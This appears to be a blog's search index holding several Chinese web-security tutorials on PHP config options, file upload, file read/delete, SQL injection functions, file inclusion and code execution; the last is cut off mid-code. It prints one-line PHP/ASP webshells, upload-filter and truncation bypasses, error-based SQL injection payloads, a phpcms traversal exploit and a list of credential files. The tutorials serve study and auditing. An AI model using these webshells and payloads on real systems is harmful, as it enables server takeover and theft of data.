<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>PHP配置中的安全选项</title>
    <link href="/PHP%E9%85%8D%E7%BD%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%80%89%E9%A1%B9/"/>
    <url>/PHP%E9%85%8D%E7%BD%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%80%89%E9%A1%B9/</url>
    
    <content type="html"><![CDATA[<p>PHP的一些安全配置</p><a id="more"></a><h1 id="PHP配置中的安全选项"><a href="#PHP配置中的安全选项" class="headerlink" title="PHP配置中的安全选项"></a>PHP配置中的安全选项</h1><h2 id="01-PHP-INI-常量定义"><a href="#01-PHP-INI-常量定义" class="headerlink" title="01 PHP_INI_*常量定义"></a>01 PHP_INI_*常量定义</h2><table><thead><tr><th>常量</th><th>含义</th></tr></thead><tbody><tr><td>PHP_INI_USER</td><td>该配置选项可以在PHP脚本或者Windows注册表配置</td></tr><tr><td>PHP_INI_PREDIR</td><td>该配置选项可以在php.ini, .htaccess或httpd.conf中配置</td></tr><tr><td>PHP_INI_SYSTEM</td><td>该配置选项可以在php.ini, 或httpd.conf中配置</td></tr><tr><td>PHP_INI_ALL</td><td>该配置选项可以在任何地方配置</td></tr><tr><td>php.ini only</td><td>该配置选项仅在php.ini中配置</td></tr></tbody></table><p>PHP配置指令修改范围决定了PHP指令在何时何地及是否可被更改。手册中的每个指令都有其所属的模式。例如有些指令可以在 PHP 脚本中用 ini_set()来设定，而有些则只能在 php.ini 或 httpd.conf 中</p><h2 id="02-相关配置"><a href="#02-相关配置" class="headerlink" title="02 相关配置"></a>02 相关配置</h2><ol><li><p>register_globals(全局变量注册开关)</p><p>PHP版本：&lt; 4.2.3 : 设置为PHP_INI_ALL</p><p>​                    5.3.0起不推荐使用</p><p>​                    5.4.0起被移除<br>当选项为On，会将GET、POST等方式提交的参数注册成全局变量并且初始化值为该参数对应的值</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'cmd'</span>]))&#123;      <span class="hljs-keyword">if</span>($cmd==<span class="hljs-string">'whoami'</span>)&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">'True'</span>      &#125;    &#125;<span class="hljs-keyword">else</span>&#123;      <span class="hljs-keyword">echo</span> <span class="hljs-string">"?cmd=whoami"</span>;<span class="hljs-meta">?&gt;</span></code></pre><p>通过GET方式在URL中提交?cmd=whoami ,网页输出True</p></li><li><p>allow_url_include(允许包含远程文件)<br>PHP版本： 5.2.0之后被默认设置为off，配置范围是PHP_INI_ALL<br>当选项为On时可以直接包含远程文件，造成文件包含漏洞</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <span class="hljs-keyword">include</span> $_GET[<span class="hljs-string">'file'</span>];<span class="hljs-meta">?&gt;</span></code></pre><p>通过GET方式在URL中提交?file=<a href="http://xxx.com/file.txt就可以读取文件" target="_blank" rel="noopener">http://xxx.com/file.txt就可以读取文件</a><br>即使后缀名不是PHP，也可以执行其中的PHP代码</p><p>类似的还有allow_url_fopen(),配置是否允许打开远程文件,影响较小</p></li><li><p>magic_quotes_gpc(魔术引号自动过滤)</p><p>PHP版本：5.3之后不推荐使用，5.4之后被取消</p><p>​                   &lt; 4.2.3时配置范围是PHP_INI_ALL</p><p>​                    &gt; 4.2.3时配置范围是PHP_INI_PREDIR<br>当选项为On时，会自动在GET、POST、COOKIE变量中的单引号、双引号、反斜杠和空字符前加上反斜杠进行转义</p><p>在PHP5中不过滤$_SERVER变量，因此client-ip、referer等漏洞能被利用</p><p>开启时，如果不存在编码（如宽字节注入）或其他特殊绕过，很多漏洞就无法使用</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>  <span class="hljs-keyword">echo</span> $_GET[<span class="hljs-string">'a'</span>]<span class="hljs-meta">?&gt;</span></code></pre><p>传入 ?a=1’<br>输出位1\‘</p></li><li><p>magic_quotes_runtime(魔术引号自动过滤)</p><p>PHP版本：5.4之后被取消，配置范围是PHP_INI_ALL<br>类似，在单引号、双引号、反斜杠和空字符前加上反斜杠进行转义<br>但它的处理对象时从数据库或文件中读取的数据</p><pre><code class="hljs txt">&#x2F;&#x2F; test.txt1&#39;2&quot;3\4</code></pre><pre><code class="hljs php"><span class="hljs-comment">// mqr.php</span><span class="hljs-meta">&lt;?php</span>  <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">"test.txt"</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>输出结果为 1\‘2\“3\\4</p></li><li><p>magic_quotes_sybase(魔术引号自动过滤)</p><p>PHP版本：5.4之后被取消，配置范围是PHP_INI_ALL</p><p>当选项为On时，会自动在GET、POST、COOKIE变量中的空字符前加上反斜杠进行转义，会将单引号变成双引号</p><p>此选项开启时，会覆盖magic_quotes_gpc=on</p> <pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>  <span class="hljs-keyword">echo</span> $_GET[<span class="hljs-string">'a'</span>]<span class="hljs-meta">?&gt;</span></code></pre><p>传入 ?a=1’2”3\4%005<br>输出位1’’2”3\4\05</p></li><li><p>safe_mode(安全模式)</p><p>PHP版本：5.4之后被取消，配置范围是PHP_INI_ALL</p><p>当选项为On时，会有两中限制：</p><ul><li>用户无法对其他所有者所有的文件进行包含、删除等操作<br>可以通过配置safe_mode_include_dir和safe_mode_exec_dir来设置允许操作的路径</li><li>无法通过system()、popen()、exec()、反引号来执行命令或程序<br>可以将需要使用的脚本放在同一目录下，并使用safe_mode_exec_dir配置可以执行的目录</li></ul></li><li><p>open_basedir(可访问目录)<br>PHP版本：&lt; 5.2.3 : 设置为PHP_INI_SYSTEM</p><pre><code>\&gt;=5.2.3 : 设置为PHP_INI_SYSTEM</code></pre><p>用于设置PHP可访问的目录，可以用分号分隔多个目录<br>如果设置为 open_basedir=/www/a ，/www/a 和 /www/ab 都可以访问<br>因此需要设置为 open_basedir=/www/a/</p></li><li><p>disable_functions(禁用函数)<br>配置范围是php.ini only，用逗号分隔多个函数名</p></li><li><p>display_errors、error_reporting(错误显示)<br>配置范围是PHP_INI_ALL<br>display_errors用于配置是否显示错误信息<br>当display_errors开启时，可以用error_reporting设置显示的级别</p><p><img src="/PHP%E9%85%8D%E7%BD%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%80%89%E9%A1%B9/1.png" srcset="/img/loading.gif" alt></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// 关闭所有PHP错误报告</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-comment">// Report simple running errors</span>error_reporting(E_ERROR | E_WARNING | E_PARSE);<span class="hljs-comment">// 报告 E_NOTICE也挺好 (报告未初始化的变量</span><span class="hljs-comment">// 或者捕获变量名的错误拼写)</span>error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);<span class="hljs-comment">// 除了 E_NOTICE，报告其他所有错误</span>error_reporting(E_ALL ^ E_NOTICE);<span class="hljs-comment">// 报告所有 PHP 错误 (参见 changelog)</span>error_reporting(E_ALL);<span class="hljs-comment">// 报告所有 PHP 错误</span>error_reporting(<span class="hljs-number">-1</span>);<span class="hljs-comment">// 和 error_reporting(E_ALL); 一样</span>ini_set(<span class="hljs-string">'error_reporting'</span>, E_ALL);<span class="hljs-meta">?&gt;</span></code></pre></li></ol>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP文件上传漏洞</title>
    <link href="/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <url>/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>文件上传漏洞的一些整理</p><a id="more"></a><h1 id="PHP文件上传漏洞"><a href="#PHP文件上传漏洞" class="headerlink" title="PHP文件上传漏洞"></a>PHP文件上传漏洞</h1><h2 id="01-原理"><a href="#01-原理" class="headerlink" title="01 原理"></a>01 原理</h2><ol><li><p>简介<br>在头像上传、附件上传等处都可能由于服务器配置不当（如开启了PUT方法）和过滤不足而产生文件上传漏洞，使用户可以上传文件</p></li><li><p>利用条件</p><ul><li>web服务器开启文件上传功能且对外开放接口</li><li>web用户对目录具有可写甚至可执行权限</li><li>web服务器可以解析上传的脚本</li><li>服务器配置不当（如开启了PUT方法）</li></ul></li><li><p>相关函数<br>对于使用框架编写的web应用，通常使用上传类来进行文件上传</p><p>常规的文件上传函数只有一个 move_uploaded_file(file,newloc)<br>第一个参数是要上传的文件，第二个是上传后存放的位置<br>如果成功该函数返回 TRUE，如果失败则返回 FALSE</p></li><li><p>危害<br>如果服务器具有目录的执行权限，就可以上传后门文件，攻击者还可以通过其他提权方法拿到系统管理权限，进一步攻击同一服务器下的其他网站</p></li></ol><h2 id="02-webshell"><a href="#02-webshell" class="headerlink" title="02 webshell"></a>02 webshell</h2><ol><li><p>简介<br>在计算机科学中，shell指“为操作者提供操作界面”的软件（命令解释器）<br>webshell是一个网站的后门，也是命令解释器，可以以HTTP协议通信，继承了web用户权限，可以接收命令在服务器端执行<br>webshell本质是一个可以在服务器端运行的脚本文件</p></li><li><p>大马和小马<br>根据代码量的大小，webshell可以分为大马和小马，几个简单小马如下</p><pre><code class="hljs php"><span class="hljs-comment">//PHP</span><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_REQUEST[<span class="hljs-string">'cmd'</span>]); <span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">//ASP</span>&lt;%<span class="hljs-keyword">eval</span> request(<span class="hljs-string">"cmd"</span>)%&gt;  <span class="hljs-comment">//ASP.NET</span>&lt;%@ Page Language=<span class="hljs-string">"Jscript"</span>%&gt;&lt;%<span class="hljs-keyword">eval</span>(Request.Item[<span class="hljs-string">"cmd"</span>],<span class="hljs-string">"unsafe"</span>);%&gt;</code></pre><p>一句话木马通常配合菜刀、蚁剑等使用，连接密码即为参数名，上边几个小马的密码都是cmd</p><p>使用小马和菜刀可以实现三大基本功能：</p><ul><li>文件管理<br>可以继承web用户权限实现查看、上传、下载、修改、删除、运行等</li><li>虚拟终端<br>可以开启虚拟终端窗口执行命令</li><li>数据库使用<br>可以进行数据库管理，但需要知道数据库的账号密码</li></ul><p>大马代码量较大，可以进行文件管理、执行命令等，可以定制</p></li></ol><h2 id="03-防御与绕过"><a href="#03-防御与绕过" class="headerlink" title="03 防御与绕过"></a>03 防御与绕过</h2><ol><li><p>防御方法：黑白名单<br>使用黑白名单限制可以上传的文件类型或者可以执行上传的用户<br>白名单优先级高于黑名单</p><p>绕过方法：检查黑白名单设置是否全面</p></li><li><p>防御方法：后缀名检查<br>检查后缀名是否是允许的类型</p><p>绕过方法：抓包修改后缀名、00截断如：1.php(0x00).jpg 或 1.php%00.jpg</p></li><li><p>防御方法：MIME类型检测<br>MIME时描述消息内容的因特网标准，常见的类型有：</p><table><thead><tr><th>文件扩展名</th><th>MIME类型</th></tr></thead><tbody><tr><td>.js</td><td>application/x-javascript</td></tr><tr><td>.html</td><td>text/html</td></tr><tr><td>.jpg</td><td>image/jpeg</td></tr><tr><td>.png</td><td>image/png</td></tr><tr><td>.pdf</td><td>application/pdf</td></tr></tbody></table><p>可以在HTTP数据包的Content-Type中查看</p><p>绕过方法：抓包修改Content-Type</p></li><li><p>防御方法：文件内容检查<br>如检查文件是否为图片，可以使用PHP中的getimagesize()函数，此函数本意是检查图片大小，但是在检查之前会首先判断文件是否是一个图片</p><p>绕过方法：在文件内容开头添加文件幻数，如添加GIF89a之后即可被认为是GIF文件</p><pre><code class="hljs angelscript">.jpg   FF D8 FF E0 <span class="hljs-number">00</span> <span class="hljs-number">10</span> <span class="hljs-number">4</span>A <span class="hljs-number">46</span> <span class="hljs-number">49</span> <span class="hljs-number">46</span>.gif   <span class="hljs-number">47</span> <span class="hljs-number">49</span> <span class="hljs-number">46</span> <span class="hljs-number">38</span> <span class="hljs-number">39</span> <span class="hljs-number">61</span>.png   <span class="hljs-number">89</span> <span class="hljs-number">50</span> <span class="hljs-number">4</span>E <span class="hljs-number">47</span></code></pre></li><li><p>防御方法：隐藏或加密上传文件名与路径<br>使上传文件名与路径不可预测，使攻击者无法找到上传的文件</p></li><li><p>攻击方法：修改./htaccess<br>./htaccess是Apache服务器的配置文件，会覆盖全局配置，作用于是当前目录及子目录，我们可以上传一个新的./htaccess来修改服务器配置</p><ul><li>解析方式<br>AddType application/x-httpd-php .png<br>写入./htaccess后，就可以执行png文件中的php代码</li><li>包含关键字<br>AddHandler php5-script php<br>写入./htaccess后，如果文件名中包含关键字.php,就可以执行代码，例如可以执行info.php.png中的PHP代码</li><li>匹配文件名<br>&lt;FilesMatch “testname”&gt;<br>SetHandler application/s-httpd-php<br>&lt;/FilesMatch&gt;<br>写入./htaccess后，就可以匹配文件名为testname的文件，并执行其中的PHP代码</li></ul></li></ol><h2 id="04-web容器解析漏洞"><a href="#04-web容器解析漏洞" class="headerlink" title="04 web容器解析漏洞"></a>04 web容器解析漏洞</h2><ol><li><p>apache 解析漏洞<br>apache会从后向前找可以识别的后缀名，因此可以命名为info.php.xx.x.x</p></li><li><p>IIS 5.x/6.0 解析漏洞</p><ul><li>方式一<br>将info.asp命名为info.asp;1.jpg，分号后的内容不被解析，即被认为是info.asp</li><li>方式二<br>创建一个1.asp的文件夹，文件夹中的文件都被当做asp文件执行，可以在其中创建info.jpg的图片木马</li></ul></li><li><p>PHP CGI 解析漏洞（IIS 7.0/7.5）<br>访问info.png时在后边加上/.php,就可以当作php运行</p><p>nginx&lt;8.03中也存在类似问题<br>如果cgi.fix_pathinfor值为1 ，就可能存在漏洞</p></li><li><p>nginx&lt;8.03 空字节漏洞<br>info.html%00.php<br>寻找文件时从前向后读，读取info.html，解析时从后向前，使用php解析</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>代码审计</tag>
      
      <tag>文件操作</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP文件操作漏洞</title>
    <link href="/PHP%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/"/>
    <url>/PHP%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>文件下载（文件读取）、文件删除</p><a id="more"></a><h1 id="PHP文件操作漏洞"><a href="#PHP文件操作漏洞" class="headerlink" title="PHP文件操作漏洞"></a>PHP文件操作漏洞</h1><h2 id="01-文件下载（文件读取）"><a href="#01-文件下载（文件读取）" class="headerlink" title="01 文件下载（文件读取）"></a>01 文件下载（文件读取）</h2><ol><li><p>原理<br>文件下载与文件读取类似，原因在于程序在下载或者读取文件时，参数filename是用户可控的，使得攻击者可以读取敏感文件</p></li><li><p>相关函数</p><ul><li>file_get_contents()</li><li>highlight_file()</li><li>fopen()</li><li>readfile()</li><li>fread()</li><li>fgetss()</li><li>fgets()</li><li>parse_ini_file()</li><li>show_source()</li><li>file()</li></ul><p>除此之外，文件包含的函数include等也可以通过PHP输入输出流来读取文件 php://filter/</p></li><li><p>phpcms v9的文件读取漏洞</p><pre><code class="hljs php"><span class="hljs-comment">// 路径 /phpcms/modules/search/index.php</span><span class="hljs-meta">&lt;?php</span>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_get_suggest_keyword</span><span class="hljs-params">()</span></span>&#123;  $url=$_GET[<span class="hljs-string">'url'</span>].<span class="hljs-string">'&amp;q='</span>.$_GET[<span class="hljs-string">'q'</span>];  $res=@file_get_contents($url);  <span class="hljs-keyword">if</span>(CHARSET != <span class="hljs-string">'gbk'</span>)&#123;    $res=iconv(<span class="hljs-string">'gbk'</span>,CHARSET,$res);  &#125;  <span class="hljs-keyword">echo</span> $res&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>可以看到代码中读取的文件的路径URL是使用用户传入的参数拼接而成的</p><p>如果我们提交url为空，q为1.php，拼接的路径为url=&amp;q=1.php</p><p>要想读取到1.php，需要将&amp;q去掉，可以将其看做目录，使用../进行跳出</p><p>即传入q=../../1.php,此时url=&amp;q=../../1.php</p><p>此时就将&amp;q=当成了目录进行跳过，可以进行文件读取</p></li></ol><h2 id="02-文件删除"><a href="#02-文件删除" class="headerlink" title="02 文件删除"></a>02 文件删除</h2><ol><li>简介<br>与文件读取类似，使用户可以删除敏感文件</li><li>相关函数<ul><li>unlink()</li><li>老版本 session_destroy()</li></ul></li><li>利用方法<br>删除当前目录下的文件或者使用../跳转来删除其他目录下的文件</li></ol><h2 id="03-文件操作漏洞的防范"><a href="#03-文件操作漏洞的防范" class="headerlink" title="03 文件操作漏洞的防范"></a>03 文件操作漏洞的防范</h2><ol><li>文件操作漏洞的共同点<ul><li>由越权操作使用户可以操作未授权操作的文件</li><li>通过跳转目录的方法来操作更多文件</li><li>在请求中传入文件名或路径</li></ul></li><li>防御手段<ul><li>对权限的管理要合理</li><li>检查参数中是否有../等跳转符号</li><li>不直接传入文件名，可以使用MD5加密等方式</li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>代码审计</tag>
      
      <tag>文件操作</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入常用函数</title>
    <link href="/SQL%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/"/>
    <url>/SQL%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p>一些常用函数与语句</p><a id="more"></a><h2 id="01-编码函数"><a href="#01-编码函数" class="headerlink" title="01 编码函数"></a>01 编码函数</h2><ol><li>hex()<br>将十进制数字或字符串转为十六进制</li><li>0x开头的十六进制可以被转换成字符串</li><li>ascii()<br>将字符串的第一个字符转换为ASCII码</li><li>ord()<br>将字符串的第一个字符转换为ASCII码<br>如果or被过滤，也会影响ord()</li><li>CHAR()<br>将ASCII码转换为字符</li></ol><h2 id="02-系统函数"><a href="#02-系统函数" class="headerlink" title="02 系统函数"></a>02 系统函数</h2><ol><li>@@datadir<br>返回数据存储目录</li><li>@@basedir<br>返回MySQL安装目录</li><li>@@version_compile_os<br>返回服务器的操作系统</li><li>database()<br>查看当前数据库名</li><li>user()<br>查看当前用户名</li><li>version()<br>查看数据库版本</li></ol><h2 id="03-字符截取函数"><a href="#03-字符截取函数" class="headerlink" title="03 字符截取函数"></a>03 字符截取函数</h2><ol><li>mid(s,m[,n])<br>s：必需，要截取的字段<br>m：必需，起始位置，从1开始计数，也可从最后一位开始从-1开始计数<br>n：可选，要截取的长度，若省略则返回剩余全部文本</li><li>substr(s,m[,n]) / substring(s,m[,n])<br>s：必需，要截取的字段<br>m：必需，起始位置，从1开始计数，也可从最后一位开始从-1开始计数<br>n：可选，要截取的长度，若省略则返回剩余全部文本<br>也可以写为substr(s FROM m FOR n)</li><li>left(s,n)<br>截取字符串s左边n位<br>类似的还有right()</li><li>length()<br>获取字符串长度</li><li>ELT(N,str1,str2,str3,…)<br>如果N =1返回str1，如果N= 2返回str2，等等<br>如果N&lt;1或者N大于参数的数量，就返回NULL</li><li>limit m,n<br>从第m行开始，截取n行（从0开始计数）</li></ol><h2 id="04-字符串拼接函数"><a href="#04-字符串拼接函数" class="headerlink" title="04 字符串拼接函数"></a>04 字符串拼接函数</h2><ol><li>concat(str1,str2…)<br>拼接字符串，无分隔符</li><li>concat_ws(separator,str1,str2,…)<br>拼接字符串，第一个参数为分隔符</li><li>group_concat(str1,str2..)<br>拼接字符串，每组（每行）结果之间用逗号分开</li><li>group_concat(concat_ws(seperator,str1,str2))<br>拼接字符串，每组（每行）结果之间用分隔符分开</li></ol><h2 id="05-报错注入函数"><a href="#05-报错注入函数" class="headerlink" title="05 报错注入函数"></a>05 报错注入函数</h2><ol><li><p>floor(n)<br>返回不大于n的最大整数</p></li><li><p>rand()<br>随即返回一个0-1之间的浮点数</p></li><li><p>group by<br>分组，当使用rand()函数进行分组聚合时，存在重复键冲突</p><pre><code class="hljs mysql">select concat(left(rand(),1),&#39;^&#39;, (select version()), &#39;^&#39;) as x,count(*) from information_schema.tables group by x</code></pre></li><li><p>updatexml()<br>由于参数不符合xpath规范，就会报错</p><pre><code class="hljs mysql">select (updatexml(1,concat(0x7e,(select user()),0x7e),1))</code></pre></li><li><p>extracvalue()</p><pre><code class="hljs mysql">select (extracvalue(1,concat(0x7e,(select user()),0x7e),1))</code></pre><p>0x7e即<del>，两个</del>之间的值即为查询结果</p></li></ol><h2 id="06-盲注函数"><a href="#06-盲注函数" class="headerlink" title="06 盲注函数"></a>06 盲注函数</h2><ol><li>if(e,t,f)<br>如果表达式e为真，就执行t，否则执行f</li><li>sleep(n)<br>延时n秒</li><li>benchmark(n,e)<br>将表达式e执行n次</li></ol><h2 id="07-information-schema"><a href="#07-information-schema" class="headerlink" title="07 information_schema"></a>07 information_schema</h2><p>在5.0以上版本中，默认定义了infomation数据库，用来存储数据库元信息。其中有表schemata（数据库名）、tables（表名）、columns（列名）</p><p>在schemata表中，schema_name字段用来存储数据库名</p><p>在tables表中，table_schema和table_name分别用来存储数据库名和表名</p><p>在columns表中，table_schema(数据库名)、table_name(表名)、column_name(字段名)</p><p><img src="/SQL%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/1.png" srcset="/img/loading.gif" alt></p>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP文件包含漏洞</title>
    <link href="/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <url>/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>文件包含漏洞的原理及利用</p><a id="more"></a><h1 id="PHP文件包含漏洞"><a href="#PHP文件包含漏洞" class="headerlink" title="PHP文件包含漏洞"></a>PHP文件包含漏洞</h1><h2 id="01-原理"><a href="#01-原理" class="headerlink" title="01 原理"></a>01 原理</h2><p>开发PHP程序时，通常将可复用的函数写入文件中，在使用这个函数时直接调用文件，不用重新编写函数，可以使程序更加灵活。如果动态包含的参数没有严格过滤，就会产生文件包含漏洞。</p><ol><li><p>文件包含漏洞的原因可以总结为以下两点：</p><ul><li>程序使用了动态包含</li><li>包含的文件路径参数客户端可控</li></ul></li><li><p>PHP中的相关配置</p><ul><li>allow_url_fopen=On/Off         本地文件包含（LFI）</li><li>allow_url_include=On/Off       远程文件包含（RFI）</li></ul></li><li><p>PHP中常用文件包含的函数有四个：</p><ul><li>include()                    文件包含失败时会继续执行</li><li>include_once()         文件包含失败时会继续执行，只会包含一次</li><li>require()                    文件包含失败时会直接结束</li><li>require_once()          文件包含失败时会直接结束，只会包含一次</li></ul></li><li><p>特点</p><ul><li>无视扩展名读取文件<br>包含文件时会读取文件的源码，打开图片时不是图像，而是图片源码</li><li>无条件解析PHP代码<br>遇到符合PHP语法规范的代码时，无论后缀名，都会执行PHP代码</li></ul></li></ol><h2 id="02-利用"><a href="#02-利用" class="headerlink" title="02 利用"></a>02 利用</h2><ol><li><p>危害</p><ul><li>读取敏感文件<br>需要文件存在，且具有可读权限</li><li>包含木马</li></ul></li><li><p>截断方式</p><ol><li><p>00截断<br>需要关闭PHP的魔术引号，PHP版本小于5.3.4</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'path'</span>]))&#123;    <span class="hljs-keyword">include</span> $_GET[<span class="hljs-string">'path'</span>].<span class="hljs-string">".html"</span>;  &#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">"?path=[path]"</span>;  &#125;</code></pre></li></ol><p>​    在以上的代码中，规定了包含文件的后缀名是html，可以使用00截断来包含其他类型的文件，提交变量?path=info.php%00即可</p><ol start="2"><li><p>./截断<br>不受GPC限制，PHP版本需要小于5.3</p><ul><li><p>在文件名之后加上./可以进行截断，如info.php……….</p><p>在Windows下240个.或者240个./可以截断，在Linux下，2038个/.可以截断</p></li><li><p>在文件可以使用../来移动目录，从而读取其他目录下的文件</p></li></ul></li><li><p>？伪截断<br>不受GPC和PHP版本的限制<br>新建一个1.txt，输入 this is 1.txt</p><p>在上述代码中提交 ?path=<a href="http://127.0.0.1/1.txt" target="_blank" rel="noopener">http://127.0.0.1/1.txt</a>?</p><p>拼接结果为?path=<a href="http://127.0.0.1/1.txt?.html" target="_blank" rel="noopener">http://127.0.0.1/1.txt?.html</a><br>?.html被当做请求参数，实际请求对象是1.txt<br>执行后成功输出1.txt中的内容</p></li></ol></li><li><p>Windows下的敏感目录</p><ul><li>C:\boot.ini            //查看系统版本</li><li>C:\windows\system32\inetsrv\MetaBase.xml    //iis配置文件</li><li>C:\windows\repair\same    //存储windows初次安装密码</li><li>C:\ProgramFiles\mysql\my.ini    //mysql配置信息</li><li>C:\ProgramFiles\mysql\data\mysql\user.MYD    //mysql root密码</li><li>C:\windows\php.ini    //php配置信息</li></ul></li><li><p>Linux\Unix下的敏感目录</p><ul><li>/etc/passwd    //账户信息</li><li>/etc/shadow    //账户密码文件</li><li>/usr/local/app/apache2/conf/httpd.conf    //Apache2默认配置文件</li><li>/usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置</li><li>/usr/local/app/php5/lib/php.ini    //php配置</li><li>/etc/httpd/conf/httpd.conf    //Apache配置</li><li>/etc/my.conf    //mysql配置</li></ul></li><li><p>相关协议</p><ul><li>file://      访问本地系统文件</li><li>http://    访问HTTP(S)网址</li><li>ftp://       访问FTP(S)网址</li><li>php://     访问输入输出流</li><li>zlib://      压缩流</li><li>data://    数据</li><li>glob://     查找匹配的文件路径模式</li><li>phar://     PHP归档</li><li>ssh2://      Secure Shell 2</li><li>rar://         RAR压缩文件</li><li>ogg://        音频流</li><li>expect://   交互式的流</li></ul><p><img src="/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/1.png" srcset="/img/loading.gif" alt></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>代码审计</tag>
      
      <tag>文件操作</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP代码执行漏洞简介</title>
    <link href="/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/"/>
    <url>/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<p>简单总结PHP中的代码执行漏洞</p><a id="more"></a><h1 id="PHP代码执行漏洞"><a href="#PHP代码执行漏洞" class="headerlink" title="PHP代码执行漏洞"></a>PHP代码执行漏洞</h1><h2 id="01-代码执行简介"><a href="#01-代码执行简介" class="headerlink" title="01 代码执行简介"></a>01 代码执行简介</h2><ol><li><p>代码执行指的是执行PHP代码，而命令执行指的是执行系统命令或应用指令</p></li><li><p>代码执行是由于应用程序过滤不严，用户可以通过请求将代码注入到应用程序中执行，造成漏洞的原因有两点：</p><ul><li>程序中含有可执行PHP代码的函数</li><li>传入函数的参数客户端可控，可以直接修改或者影响</li></ul></li><li><p>漏洞危害：</p><ul><li><p>继承web服务器权限，执行任意代码</p></li><li><p>如果web服务器权限较高，可以读写文件，控制网络和服务器</p></li></ul></li></ol><h2 id="02-代码执行的相关函数"><a href="#02-代码执行的相关函数" class="headerlink" title="02 代码执行的相关函数"></a>02 代码执行的相关函数</h2><ol><li><p>eval和assert<br>将参数作为PHP代码执行<br>参数必须是完整的php语句，包括分号</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    @<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">'cmd'</span>]);<span class="hljs-meta">?&gt;</span></code></pre><p><img src="/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/1.png" srcset="/img/loading.gif" alt></p><p><img src="/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/2.png" srcset="/img/loading.gif" alt></p></li><li><p>preg_replace<br>preg_replace($pattern, $replacement, $subject)<br>正则替换的方法是搜索$subject，将符合$pattern的部分用$replacement进行替换，如果$pattern中含有参数/e，就将$replacement作为PHP代码执行<br>测试代码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'code'</span>]))&#123;        $code=$_GET[<span class="hljs-string">'code'</span>];        preg_replace(<span class="hljs-string">"/\[(.*)\]/e"</span>,<span class="hljs-string">'\\1'</span>,$code);    &#125;<span class="hljs-keyword">else</span>&#123;        <span 